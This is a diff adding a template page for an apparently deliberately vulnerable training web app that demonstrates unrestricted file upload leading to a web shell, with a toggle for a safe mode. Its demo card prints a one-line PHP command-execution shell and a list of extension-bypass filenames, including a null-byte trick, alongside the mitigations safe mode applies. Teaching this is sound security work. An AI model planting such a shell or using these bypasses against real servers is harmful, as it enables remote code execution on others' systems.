@@ -1,0 +1,79 @@
+{% extends "base.html" %}
+{% block title %}File Upload{% endblock %}
+{% block content %}
+<h1 class="page-title">File Upload → Web Shell</h1>
+<p class="page-subtitle">A03:2021 · Unrestricted file upload allows attackers to upload executable code → RCE</p>
+
+<div class="mode-banner {{ 'safe' if safe else 'vuln' }}">
+  <span class="badge">{{ 'SAFE MODE' if safe else 'VULNERABLE' }}</span>
+  {% if safe %}Extension whitelist + magic bytes validation + UUID rename applied.{% else %}No validation — any file accepted, saved with original name, served as executable.{% endif %}
+  <button onclick="toggleSafe()" class="btn {{ 'btn-red' if safe else 'btn-green' }}" style="margin-left:auto;font-size:11px;padding:0.3rem 0.8rem;">Switch to {{ 'Vulnerable' if safe else 'Safe' }} Mode</button>
+</div>
+
+<div class="split">
+  <div>
+    <div class="card">
+      <div class="card-header"><span>📎</span><span class="card-title">Upload File</span></div>
+      <form method="POST" action="/upload?safe={{ '1' if safe else '0' }}" enctype="multipart/form-data">
+        <div class="form-group">
+          <label class="form-label">Select File</label>
+          <input type="file" name="file" class="form-input" style="padding:0.4rem;">
+        </div>
+        <button type="submit" class="btn btn-green" style="width:100%;">Upload →</button>
+      </form>
+      {% if message %}<div class="alert alert-success" style="margin-top:0.75rem;">✓ {{ message }}</div>{% endif %}
+      {% if error %}<div class="alert alert-danger" style="margin-top:0.75rem;">✗ {{ error }}</div>{% endif %}
+
+      {% if uploaded_path %}
+      <div class="alert alert-danger" style="margin-top:0.75rem;">
+        File served at: <a href="{{ uploaded_path }}" target="_blank" style="color:var(--red);">{{ uploaded_path }}</a><br>
+        <small>If this is a .php file — click to simulate execution</small>
+      </div>
+      {% endif %}
+
+      {% if files %}
+      <div style="margin-top:1rem;">
+        <div style="font-size:11px;color:var(--gray);margin-bottom:0.5rem;">Recent uploads:</div>
+        <table class="table">
+          <thead><tr><th>Filename</th><th>Uploaded</th><th>Action</th></tr></thead>
+          <tbody>
+          {% for f in files %}
+          <tr>
+            <td><code style="font-size:11px;color:{% if '.php' in f.filename %}var(--red){% else %}var(--green){% endif %};">{{ f.filename }}</code></td>
+            <td style="font-size:11px;color:var(--gray);">{{ f.uploaded_at }}</td>
+            <td><a href="/upload/serve/{{ f.filename }}" target="_blank" class="btn btn-red" style="font-size:10px;padding:2px 8px;">Open</a></td>
+          </tr>
+          {% endfor %}
+          </tbody>
+        </table>
+      </div>
+      {% endif %}
+    </div>
+  </div>
+
+  <div>
+    <div class="card">
+      <div class="card-header"><span>💡</span><span class="card-title">Attack Demo</span></div>
+      <div style="font-size:12px;color:var(--gray);margin-bottom:0.75rem;">Create a PHP web shell on your machine, then upload it:</div>
+      <div class="code-block" style="font-size:11px;"># Create shell.php
+echo '<?php system($_GET["cmd"]); ?>' > shell.php
+
+# Upload in vulnerable mode → 
+# Access at /upload/serve/shell.php?cmd=id</div>
+
+      <div style="margin-top:1rem;font-size:12px;color:var(--gray);margin-bottom:0.5rem;">Extension bypass tricks:</div>
+      {% for bypass in ["shell.php", "shell.PHP", "shell.php.jpg", "shell.php%00.jpg", "shell.phtml", "shell.pHp3"] %}
+      <code style="display:block;font-size:11px;color:var(--red);margin-bottom:3px;background:#010409;padding:3px 8px;border-radius:3px;">{{ bypass }}</code>
+      {% endfor %}
+
+      <div class="alert alert-info" style="margin-top:1rem;">
+        <strong>Safe mode does:</strong><br>
+        1. Whitelist: only .jpg .jpeg .png .gif<br>
+        2. Magic bytes check (FF D8 FF for JPEG, etc.)<br>
+        3. UUID rename: shell.php → a3f9bc12....jpg<br>
+        4. Serves with Content-Disposition: attachment
+      </div>
+    </div>
+  </div>
+</div>
+{% endblock %}
